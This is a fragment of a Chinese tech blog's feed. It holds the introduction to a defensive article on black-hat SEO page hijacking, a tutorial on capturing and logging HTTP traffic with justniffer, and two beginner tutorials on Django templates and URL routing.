&lt;p&gt;　　首先得说黑帽SEO是个老话题，我不难想想评论区必定有人吐槽此手法已经由来已久，作者有炒冷饭的嫌疑。我对此观点表示认可，然而细细回味之后，却又感到无奈不解。一个早已被用烂的黑产手法，一个每年给互联网产业造成巨大损失的黑色手段，为何能一直延续至今？是技术上难以攻破，还是利益驱使下选择视而不见？&lt;br&gt;　　当我发现公开资源中对此黑产手法的介绍寥寥无几且并不详细时，原因便可想而知了。为了营造了一个良好的互联网环境，我在此结合实际案列对黑帽SEO这种黑产手段进行剖析介绍，希望能够使安全界同道引起共鸣，共同抵制。由于距本文撰写已过去一年之久，而此期间我已不在研究相关技术，因此若文章内容有任何偏差及谬误请谅解。&lt;/p&gt;
&lt;p&gt;插曲：有趣的是，就在前几天有位朋友询问了我关于黑帽SEO方面的问题，原因是他一位朋友运营的一个网站，页面莫名其妙出现了赌博博彩的内容，删除后又会自动生成，其十分苦难便寻求他帮忙。&lt;br&gt;
    
    </summary>
    
      <category term="黑产研究" scheme="http://thief.one/categories/%E9%BB%91%E4%BA%A7%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="黑帽seo" scheme="http://thief.one/tags/%E9%BB%91%E5%B8%BDseo/"/>
    
      <category term="网页劫持" scheme="http://thief.one/tags/%E7%BD%91%E9%A1%B5%E5%8A%AB%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>justniffer抓取流量大法</title>
    <link href="http://thief.one/2017/09/27/1/"/>
    <id>http://thief.one/2017/09/27/1/</id>
    <published>2017-09-27T03:26:04.000Z</published>
    <updated>2017-09-27T05:56:34.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Understand yourself in order to better understanding others<br>知己方能解人</blockquote><br>　　本篇简单介绍一款流量抓取神器—justniffer，其能在线抓取流量也能离线分析数据包。justniffer与网络抓包神器wireshark相比，用法更为简单且对网络影响较小。面对海量的流量，我们需要经常从中分析出恶意请求，从而去做好防御，因此我在此记录justniffer的一些基础用法，以做备份查阅。<br><a id="more"></a></p>
<h3 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo add-apt-repository ppa:oreste-notelli/ppa </div><div class="line">sudo apt-get update</div><div class="line">sudo apt-get install justniffer</div></pre></td></tr></table></figure>
<h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><h4 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">justniffer -i eth5 -u -l <span class="string">"%request.header.host  %request.method %request.url  %response.grep(\r\n\r\n(.*)) %request.grep(\r\n\r\n(.*))"</span></div></pre></td></tr></table></figure>
<h4 id="重点参数"><a href="#重点参数" class="headerlink" title="重点参数"></a>重点参数</h4><ul>
<li>-i 指定监听的网络接口</li>
<li>-l 指定日志输出格式</li>
<li>-u 将不可打印的字符解析为.</li>
</ul>
<h4 id="日志格式"><a href="#日志格式" class="headerlink" title="日志格式"></a>日志格式</h4><ul>
<li>%request.header.host #请求头中的HOST</li>
<li>%request.method #请求类型</li>
<li>%request.url #请求URL</li>
<li>%request.grep(\r\n\r\n(.*)) #请求数据包</li>
<li>%response.grep(\r\n\r\n(.*)) #response的数据包</li>
</ul>
<h3 id="后期处理"><a href="#后期处理" class="headerlink" title="后期处理"></a>后期处理</h3><p>一般来说我们在抓取流量后，需要先保存在本地然后再进行规则的分析。然而如何保存，保存后该怎么提取关键内容呢？这里提供一个小小的方法。</p>
<h4 id="抓取流量存入文件"><a href="#抓取流量存入文件" class="headerlink" title="抓取流量存入文件"></a>抓取流量存入文件</h4><p>可以使用如下命令抓取指定几个参数的流量内容，并存入到文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">justniffer -i eth5 -u -l <span class="string">"%request.header.host NMASKnmask %request.method NMASKnmask %request.url NMASKnmask %response.grep(\r\n\r\n(.*)) NMASKnmask %request.grep(\r\n\r\n(.*))"</span> | awk -F nmask <span class="string">'$1 !~ /^-/ &amp;&amp; $2 ~ /(GET|POST).*/ &#123;print$2,$1,$3,$4,$5&#125;'</span>  &gt;&gt; /<span class="built_in">log</span>/20170927.log 2&gt;&amp;1</div></pre></td></tr></table></figure></p>
<p>说明：该命令获取了流量的host、method、url、response_body、request_body内容(注意：这里只筛选了GET、POST的请求)，然后将其存入了/log/20170927.log文件中。我们可以运行此命令一段时间，比如1个小时，当结束进程后我们便收集了一个小时的流量信息。</p>
<h4 id="处理日志文件"><a href="#处理日志文件" class="headerlink" title="处理日志文件"></a>处理日志文件</h4><p>打开/log/20170927.log文件，我们看到的每一行的内容格式如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GET NMASK www.baidu.com NMASK /test.html NMASK response_body=&#123;<span class="string">"result"</span>:<span class="string">"123"</span>&#125; NMASK request_body=&#123;<span class="string">"get"</span>:<span class="string">"123"</span>&#125;</div></pre></td></tr></table></figure></p>
<p>说明：每一行文件内容都包含一份流量信息，流量信息分为五个内容，每个内容间用NMASK（特殊字符串，可自定义）隔开。然后我们便可以写python脚本，遍历日志文件，并用split(“NMASK”)获取每一个流量信息了。</p>
<p>更多的配置信息、命令参数，可参考：<a href="http://www.jianshu.com/p/02021de8f82e" target="_blank" rel="external">http://www.jianshu.com/p/02021de8f82e</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Understand yourself in order to better understanding others&lt;br&gt;知己方能解人&lt;/blockquote&gt;&lt;br&gt;　　本篇简单介绍一款流量抓取神器—justniffer，其能在线抓取流量也能离线分析数据包。justniffer与网络抓包神器wireshark相比，用法更为简单且对网络影响较小。面对海量的流量，我们需要经常从中分析出恶意请求，从而去做好防御，因此我在此记录justniffer的一些基础用法，以做备份查阅。&lt;br&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://thief.one/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="justniffer" scheme="http://thief.one/tags/justniffer/"/>
    
  </entry>
  
  <entry>
    <title>Django基础之模版</title>
    <link href="http://thief.one/2017/09/15/2/"/>
    <id>http://thief.one/2017/09/15/2/</id>
    <published>2017-09-15T08:33:11.000Z</published>
    <updated>2017-09-18T09:35:12.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Life is not all roses<br>人生并不是康庄大道</blockquote><br>　　Django中的模版即前端展示，或者说HTML页面，涉及到html、js、css的部分我不做太多了介绍，因为主要是前端的一些东西。本篇主要介绍一下模版与视图的相互传值，以及模版的继承等内容。<br><a id="more"></a></p>
<h3 id="创建模版"><a href="#创建模版" class="headerlink" title="创建模版"></a>创建模版</h3><p>默认情况下，我们在视图函数中使用render渲染index.html页面。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">def home(request):</div><div class="line">    <span class="built_in">return</span> render(request, <span class="string">'index.html'</span>)</div></pre></td></tr></table></figure></p>
<p>之后在应用目录下新建一个templates文件，里面新建index.html文件即可。</p>
<h3 id="模版给视图传参"><a href="#模版给视图传参" class="headerlink" title="模版给视图传参"></a>模版给视图传参</h3><p>　　这一部分比较简单，比如使用form表单，向具体某个url传递一些参数，当然这里需要设置urls.py路由，不然模版的请求无法准确传达到视图的具体处理函数上。<br>模版：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;form action=<span class="string">"/add/"</span> method=<span class="string">"get"</span>&gt;</div><div class="line">&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"content"</span>&gt;</div><div class="line">&lt;input <span class="built_in">type</span>=<span class="string">"submit"</span>&gt;</div><div class="line">&lt;/form&gt;</div></pre></td></tr></table></figure></p>
<p>视图：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">def add(request):</div><div class="line">    content=request.GET.get(<span class="string">"content"</span>)</div><div class="line"></div><div class="line">    <span class="built_in">return</span> HttpResponse(content)</div></pre></td></tr></table></figure></p>
<p>urls.py:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">from django.conf.urls import url</div><div class="line">from webapp import views <span class="comment">#导入app的views文件</span></div><div class="line"></div><div class="line">urlpatterns = [</div><div class="line">    url(r<span class="string">'^add/'</span>, views.add),</div></pre></td></tr></table></figure></p>
<p>模版给视图传默认值的参数:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;form action=<span class="string">"/update/"</span> method=<span class="string">"GET"</span>&gt;</div><div class="line">    &lt;input <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"nid"</span> value=<span class="string">"&#123;&#123; i.nid &#125;&#125;"</span>&gt;</div><div class="line">    &lt;input <span class="built_in">type</span>=<span class="string">"submit"</span> value=<span class="string">"获取详情"</span> /&gt;</div><div class="line">&lt;/form&gt;</div></pre></td></tr></table></figure></p>
<p>说明：模版传给视图的update方法，参数为nid，值为i.nid。</p>
<h3 id="视图给模版传参"><a href="#视图给模版传参" class="headerlink" title="视图给模版传参"></a>视图给模版传参</h3><p>将上面的视图代码改成：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">def add(request):</div><div class="line">    content=<span class="string">"123"</span></div><div class="line">    <span class="built_in">return</span> render(request,<span class="string">"index.html"</span>,&#123;<span class="string">"content"</span>:content&#125;)</div></pre></td></tr></table></figure></p>
<p>模版代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;p&gt;content is &#123;&#123;content&#125;&#125;&lt;/p&gt;</div></pre></td></tr></table></figure></p>
<p>说明：除了字符串，还可以传递字典、列表等数据结构。</p>
<h4 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h4><p>python中字典的取值是list[0]，在模版中使用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&#123; list.0 &#125;&#125;</div></pre></td></tr></table></figure></p>
<h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h4><p>python中字典的取值是dict[“key”]，在模版中使用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&#123; dict.key &#125;&#125;</div></pre></td></tr></table></figure></p>
<h4 id="FOR循环"><a href="#FOR循环" class="headerlink" title="FOR循环"></a>FOR循环</h4><p>遍历列表：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&#123;% <span class="keyword">for</span> i <span class="keyword">in</span> content %&#125;</div><div class="line">&#123;&#123; i &#125;&#125;</div><div class="line">&#123;% endfor %&#125;</div></pre></td></tr></table></figure></p>
<p>遍历列表且输出的值后面添加，：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&#123;% <span class="keyword">for</span> i <span class="keyword">in</span> content %&#125;</div><div class="line">&#123;&#123; i &#125;&#125;,</div><div class="line">&#123;% endfor %&#125;</div></pre></td></tr></table></figure></p>
<p>遍历字典：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&#123;% <span class="keyword">for</span> key, value <span class="keyword">in</span> info_dict.items %&#125;</div><div class="line">    &#123;&#123; key &#125;&#125;: &#123;&#123; value &#125;&#125;</div><div class="line">&#123;% endfor %&#125;</div></pre></td></tr></table></figure></p>
<p>多层循环<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&#123;% <span class="keyword">for</span> i <span class="keyword">in</span> content %&#125;</div><div class="line">&#123;% <span class="keyword">for</span> j <span class="keyword">in</span> i.pan %&#125;</div><div class="line">&#123;&#123; j &#125;&#125;</div><div class="line">&#123;% endfor %&#125;</div><div class="line">&#123;% endfor %&#125;</div></pre></td></tr></table></figure></p>
<p>循环的参数：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">forloop.counter 索引从 1 开始算</div><div class="line">forloop.counter0    索引从 0 开始算</div><div class="line">forloop.revcounter  索引从最大长度到 1</div><div class="line">forloop.revcounter0 索引从最大长度到 0</div><div class="line">forloop.first   当遍历的元素为第一项时为真</div><div class="line">forloop.last    当遍历的元素为最后一项时为真</div><div class="line">forloop.parentloop  用在嵌套的 <span class="keyword">for</span> 循环中，获取上一层 <span class="keyword">for</span> 循环的 forloop</div></pre></td></tr></table></figure></p>
<p>判断列表是否为空：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&#123;% <span class="keyword">for</span> i <span class="keyword">in</span> list %&#125;</div><div class="line">    &lt;li&gt;&#123;&#123; i.name &#125;&#125;&lt;/li&gt;</div><div class="line">&#123;% empty %&#125;</div><div class="line">    &lt;li&gt;抱歉，列表为空&lt;/li&gt;</div><div class="line">&#123;% endfor %&#125;</div></pre></td></tr></table></figure></p>
<h4 id="逻辑判断"><a href="#逻辑判断" class="headerlink" title="逻辑判断"></a>逻辑判断</h4><h5 id="gt-lt-lt-gt"><a href="#gt-lt-lt-gt" class="headerlink" title="== != &gt;= &lt;= &lt; &gt;"></a>== != &gt;= &lt;= &lt; &gt;</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&#123;% <span class="keyword">if</span> var &gt;= 90 %&#125;</div><div class="line"><span class="keyword">case</span> 1</div><div class="line">&#123;% <span class="keyword">elif</span> var &gt;= 80 %&#125;</div><div class="line"><span class="keyword">case</span> 2</div><div class="line">&#123;% <span class="keyword">elif</span> var &gt;= 70 %&#125;</div><div class="line"><span class="keyword">case</span> 3</div><div class="line">&#123;% <span class="keyword">elif</span> var &gt;= 60 %&#125;</div><div class="line"><span class="keyword">case</span> 4</div><div class="line">&#123;% <span class="keyword">else</span> %&#125;</div><div class="line"><span class="keyword">case</span> 5</div><div class="line">&#123;% endif %&#125;</div></pre></td></tr></table></figure>
<h5 id="and-not-or-in-not-in"><a href="#and-not-or-in-not-in" class="headerlink" title="and not or in not in"></a>and not or in not in</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&#123;% <span class="keyword">if</span> num &lt;= 100 and num &gt;= 0 %&#125;</div><div class="line"><span class="keyword">case</span> 1</div><div class="line">&#123;% <span class="keyword">else</span> %&#125;</div><div class="line"><span class="keyword">case</span> 2</div><div class="line">&#123;% endif %&#125;</div></pre></td></tr></table></figure>
<p>判断元素是否在列表中：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&#123;% <span class="keyword">if</span> <span class="string">'nmask'</span> <span class="keyword">in</span> List %&#125;</div><div class="line"><span class="keyword">case</span> 1</div><div class="line">&#123;% endif %&#125;</div></pre></td></tr></table></figure></p>
<h5 id="内置变量"><a href="#内置变量" class="headerlink" title="内置变量"></a>内置变量</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&#123;&#123; request.user &#125;&#125; 当前用户</div><div class="line">&#123;&#123; request.path &#125;&#125; 当前网址</div><div class="line">&#123;&#123; request.GET.urlencode &#125;&#125; 当前get参数</div></pre></td></tr></table></figure>
<h3 id="模版继承"><a href="#模版继承" class="headerlink" title="模版继承"></a>模版继承</h3><p>　　一般开发网页都需要写一些模版页面，比如导航栏、底部版权、侧边导航等，或者是某些功能代码。以前可能会使用iframe框架，但现在已经被淘汰了。为了避免重复写代码，也为了后期修改方便，可以使用模版继承的方式。所谓模版继承，就是先写好一个通用的模版，然后标记一些变量，其他页面继承后对标记的地方可以自行修改，若不修改模版使用模版页的内容。<br>base.html<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html lang=<span class="string">"en"</span>&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"style.css"</span> /&gt;</div><div class="line">    &lt;title&gt;&#123;% block title %&#125;My amazing site&#123;% endblock %&#125;&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line"></div><div class="line">&lt;body&gt;</div><div class="line">    &lt;div id=<span class="string">"sidebar"</span>&gt;</div><div class="line">        &#123;% block sidebar %&#125;</div><div class="line">        &lt;ul&gt;</div><div class="line">            &lt;li&gt;&lt;a href=<span class="string">"/"</span>&gt;Home&lt;/a&gt;&lt;/li&gt;</div><div class="line">            &lt;li&gt;&lt;a href=<span class="string">"/blog/"</span>&gt;Blog&lt;/a&gt;&lt;/li&gt;</div><div class="line">        &lt;/ul&gt;</div><div class="line">        &#123;% endblock %&#125;</div><div class="line">    &lt;/div&gt;</div><div class="line"></div><div class="line">    &lt;div id=<span class="string">"content"</span>&gt;</div><div class="line">        &#123;% block content %&#125;&#123;% endblock %&#125;</div><div class="line">    &lt;/div&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>说明：可以尽可能多的定义block块，这样可以自定义的地方就会比较多，可以更灵活使用。</p>
<p>index.html<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&#123;% extends <span class="string">"base.html"</span> %&#125;</div><div class="line"></div><div class="line">&#123;% block title %&#125;My amazing blog&#123;% endblock %&#125;</div><div class="line">&#123;% block content %&#125;</div><div class="line">&#123;% <span class="keyword">for</span> entry <span class="keyword">in</span> blog_entries %&#125;</div><div class="line">    &lt;h2&gt;&#123;&#123; entry.title &#125;&#125;&lt;/h2&gt;</div><div class="line">    &lt;p&gt;&#123;&#123; entry.body &#125;&#125;&lt;/p&gt;</div><div class="line">&#123;% endfor %&#125;</div><div class="line">&#123;% endblock %&#125;</div></pre></td></tr></table></figure></p>
<h4 id="多模版继承"><a href="#多模版继承" class="headerlink" title="多模版继承"></a>多模版继承</h4><p>环境：先有一个根模版，然后创建一个子模版，用来继承根模版，然后其他页面继承子模版。<br>base.html（父模版页面）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &#123;% block head %&#125;&#123;% endblock %&#125;</div><div class="line">    &lt;title&gt;&#123;% block title %&#125;&#123;% endblock %&#125;&lt;/title&gt;</div><div class="line">&lt;/head&gt; </div><div class="line">&lt;body&gt;</div><div class="line">&#123;% block body %&#125;&#123;% endblock %&#125;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>base_ch.html（子模版页面）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&#123;% extends <span class="string">"base.html"</span> %&#125;</div><div class="line">&#123;% block body %&#125;</div><div class="line"></div><div class="line">&#123;% block js %&#125;</div><div class="line">&lt;script <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;</div><div class="line">    var a = 1;</div><div class="line">&lt;/script&gt;</div><div class="line">&#123;% endblock %&#125;</div><div class="line"></div><div class="line">&#123;% block label %&#125;</div><div class="line">&lt;label&gt;This is a base_ch module <span class="built_in">test</span>!&lt;/label&gt;</div><div class="line">&#123;% endblock %&#125;</div><div class="line"></div><div class="line">&#123;% endblock %&#125;</div></pre></td></tr></table></figure></p>
<p>index.html(普通继承页面)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&#123;% extends <span class="string">"base_ch.html"</span> %&#125;</div><div class="line">&#123;% block js %&#125;&#123;% endblock %&#125;</div><div class="line"></div><div class="line">&#123;% block label %&#125;</div><div class="line">&lt;label&gt;This is a index page <span class="built_in">test</span>!&lt;/label&gt;</div><div class="line">&#123;% endblock %&#125;</div></pre></td></tr></table></figure></p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="http://code.ziqiangxuetang.com/django/django-template2.html" target="_blank" rel="external">http://code.ziqiangxuetang.com/django/django-template2.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Life is not all roses&lt;br&gt;人生并不是康庄大道&lt;/blockquote&gt;&lt;br&gt;　　Django中的模版即前端展示，或者说HTML页面，涉及到html、js、css的部分我不做太多了介绍，因为主要是前端的一些东西。本篇主要介绍一下模版与视图的相互传值，以及模版的继承等内容。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="http://thief.one/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="django" scheme="http://thief.one/tags/django/"/>
    
  </entry>
  
  <entry>
    <title>Django基础之URL路由</title>
    <link href="http://thief.one/2017/09/15/1/"/>
    <id>http://thief.one/2017/09/15/1/</id>
    <published>2017-09-15T07:59:48.000Z</published>
    <updated>2017-09-18T09:28:39.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Read, study and learn about everything imporant in your life<br>点点滴滴皆重要，处处学习是诀窍</blockquote><br>　　Django中有个urls.py文件，专门用于管理django的url即路由，我们可以在urls.py文件中创建或者修改路由，以达到访问不同url执行不同view函数的作用。<br><a id="more"></a></p>
<h3 id="urls-py"><a href="#urls-py" class="headerlink" title="urls.py"></a>urls.py</h3><p>先看下urls.py长啥样？<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">from django.conf.urls import url</div><div class="line">from django.contrib import admin</div><div class="line"></div><div class="line">urlpatterns = [</div><div class="line">    url(r<span class="string">'^admin/'</span>, admin.site.urls),</div></pre></td></tr></table></figure></p>
<p>　　默认情况下，django只有一条路由，即admin，当我们开启manage.py，我们只能访问到127.0.0.1:8000/admin/目录，其余的都无法访问。</p>
<h4 id="创建路由"><a href="#创建路由" class="headerlink" title="创建路由"></a>创建路由</h4><p>　　可以看到，路由的创建符合正则表达式的规则，^表示开始，$表示结尾；<br>　　另外路由的匹配是从上到下的，也就是说从第一条路由开启匹配，如果满足则不往下匹配，如果不匹配则继续往下。因此为了避免访问到不存在的url，而导致报错，可以再最后添加一条匹配任何url的路由，可以跳转到404页面（自己定义），也可以跳转到主页。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">from django.conf.urls import url</div><div class="line">from django.contrib import admin</div><div class="line">from webapp import views <span class="comment">#导入app的views文件</span></div><div class="line"></div><div class="line">urlpatterns = [</div><div class="line">    url(r<span class="string">'^admin/'</span>, admin.site.urls),</div><div class="line"></div><div class="line">    url(r<span class="string">'^.*$'</span>,views.index,name=<span class="string">"index"</span>), <span class="comment">#定义万能路由，注意这条路由一定要放在最后。</span></div></pre></td></tr></table></figure></p>
<h4 id="URL伪静态改造"><a href="#URL伪静态改造" class="headerlink" title="URL伪静态改造"></a>URL伪静态改造</h4><p>一般当我们要传参时，url类似：127.0.0.1/app/?a=1&amp;b=2<br>此时urls.py的配置是这样的：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">from django.conf.urls import url</div><div class="line">from webapp import views <span class="comment">#导入app的views文件</span></div><div class="line"></div><div class="line">urlpatterns = [</div><div class="line">    url(r<span class="string">'^app/$'</span>, views.app , name=<span class="string">"app"</span>),</div></pre></td></tr></table></figure></p>
<p>此时view.py的代码是这样的：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">def app(request):</div><div class="line">    a=request.GET.get(<span class="string">"a"</span>)</div><div class="line">    b=request.GET.get(<span class="string">"b"</span>)</div><div class="line"></div><div class="line">    <span class="built_in">return</span> HttpResponse(a+b)</div></pre></td></tr></table></figure></p>
<p>然而如果我们想要将URL变成：127.0.0.1/app/1/2/呢？</p>
<p>修改urls.py：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">from django.conf.urls import url</div><div class="line">from webapp import views <span class="comment">#导入app的views文件</span></div><div class="line"></div><div class="line">urlpatterns = [</div><div class="line">    url(r<span class="string">'^app/(\d+)/(\d+)/$'</span>, views.app , name=<span class="string">"app"</span>),</div></pre></td></tr></table></figure></p>
<p>修改view.py：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">def app(request,a,b):</div><div class="line"></div><div class="line">    <span class="built_in">return</span> HttpResponse(str(int(a)+int(b)))</div></pre></td></tr></table></figure></p>
<h4 id="Url-name"><a href="#Url-name" class="headerlink" title="Url name"></a>Url name</h4><p>我们看到urls.py中的路由配置中，有name字段，可有可无，但建议写上。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">urlpatterns = [</div><div class="line">    url(r<span class="string">'^app/$'</span>, views.app , name=<span class="string">"app"</span>),</div></pre></td></tr></table></figure></p>
<p>说明：name相当于给这条路由起一个名称，好处在于路由的正则可能会经常变，随之而来的时html里面的url也需要变，因为需要与urls里的路由对应起来。但如果给路由起了名字，则可以在html中使用路由的名字，这样当路由的正则发生改变，但只要名字不变，html中就不需要改。</p>
<p>HTML页面中可以这样用：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&#123;% url <span class="string">'name'</span> %&#125; 不带参数</div><div class="line">&#123;% url <span class="string">'name'</span> 参数 %&#125;  带参数的：参数可以是变量名</div><div class="line"> </div><div class="line">&lt;a href=<span class="string">"&#123;% url 'app' 4 5 %&#125;"</span>&gt;link&lt;/a&gt;</div><div class="line">&lt;a href=<span class="string">"&#123;% url 'app' %&#125;"</span>&gt;link&lt;/a&gt;</div><div class="line">&lt;a href=<span class="string">"&#123;% url 'app' %&#125;?a=1&amp;b=2"</span>&gt;link&lt;/a&gt;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
